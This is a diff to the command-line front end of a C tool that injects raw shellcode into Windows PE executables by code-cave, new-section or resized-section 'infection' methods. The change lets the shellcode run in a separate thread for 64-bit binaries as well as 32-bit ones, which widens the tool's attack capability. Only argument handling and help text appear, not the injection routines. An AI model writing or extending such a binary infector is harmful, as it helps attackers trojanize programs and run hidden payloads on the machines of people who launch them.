@@ -201,28 +201,23 @@ int main(int argc, char** argv) {
 			}
 			break;
 		case MODE_64BIT:
-			if (thread_flag) {
-				fprintf(stderr, "Thread flag can apply for 32bit binaries only\n");
-				err = -11;
-				break;
-			}
 			switch (method) {
 				case METHOD_CODE_INJECT:
-					err = pe64_infect_section(&ntHeader64, sections, xcode, xcode_size);
+					err = pe64_infect_section(&ntHeader64, sections, xcode, xcode_size, thread_flag);
 					break;
 				case METHOD_CODE_NEWSECT:
 					if (sectOriginalGapSize <= sizeof(pe_section_header)) {
 						fprintf(stderr, "Not enough space in section header for new section record\n");
 						err = -10;
 					} else {
-						err = pe64_infect_new_section(&ntHeader64, sections, xcode, xcode_size, strlen(section_name) ? section_name : ".code");
+						err = pe64_infect_new_section(&ntHeader64, sections, xcode, xcode_size, strlen(section_name) ? section_name : ".code", thread_flag);
 						if (!err) {
 							sectOriginalGapSize -= sizeof(pe_section_header); //decrease section gap
 						}
 					}
 					break;
 				case METHOD_CODE_RESIZE:
-					err = pe64_infect_resize_section(&ntHeader64, sections, xcode, xcode_size);
+					err = pe64_infect_resize_section(&ntHeader64, sections, xcode, xcode_size, thread_flag);
 					break;
 			}
 			
@@ -313,11 +308,11 @@ static void PrintHelp(char* prog_name) {
 	fprintf(stdout, "\t -d - show section info\n");
 	fprintf(stdout, "\t -m - set infection method (available values: code, sect, resz)\n");
 	fprintf(stdout, "\t -n - set new section name (for selected method: sect)\n");
-	fprintf(stdout, "\t -t - execute shellcode within a separate thread (for 32bit and resize or new section methods only)\n");
+	fprintf(stdout, "\t -t - execute shellcode within a separate thread\n");
 	fprintf(stdout, "Long options usage: %s --input <input_file> --output <output_file> --shellcode <raw_shellcode_file>\n", prog_name);
 	fprintf(stdout, "\t --info - show section info\n");
 	fprintf(stdout, "\t --method - set infection method (available values: code, sect, resz)\n");
 	fprintf(stdout, "\t --name - set new section name (for selected method: sect)\n");
-	fprintf(stdout, "\t --thread - execute shellcode within a separate thread (for 32bit only)\n");
+	fprintf(stdout, "\t --thread - execute shellcode within a separate thread\n");
 	exit(-99);
 }
